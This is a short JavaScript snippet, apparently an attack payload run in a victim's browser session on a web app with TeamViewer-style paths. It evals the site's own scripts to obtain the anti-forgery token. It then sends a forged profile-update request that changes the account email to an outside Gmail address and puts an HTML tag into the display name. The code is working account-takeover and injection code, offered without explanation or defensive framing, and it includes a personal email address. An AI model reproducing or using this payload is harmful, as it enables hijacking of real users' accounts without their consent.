fetch('/Scripts/translations/tl-en.js?v=15.69.3.0')
.then(async (res) => {
    const js = await res.text();
    eval(js);
    fetch('/home/configv2.js?rev=15.69.3.0')
    .then(async (res) => {
        const js = await res.text();
        eval(js);
        fetch('/UserManagement/UpdateProfile',{
        method:'POST',
        headers:{
            'Content-Type':'application/json',
            [tv.config.xsrfTokenKey]:tv.config.xsrfToken,
            'X-Requested-With': 'XMLHttpRequest'
        },
        body:'{"CommentAfterSessionEnd":"true","CustomQJConfigId":null,"CustomQSConfigId":null,"EnableSessionCodeEmails":"true","DisplayName":". MY_BEST_<s>AR est egale a 212.","Email":"yassou200121+52222@gmail.com","LogConnections":"true","WantsProductPreview":"false","EmailLanguage":0,"WantsTrustDeviceViaPush":"false"}'});
    });
});

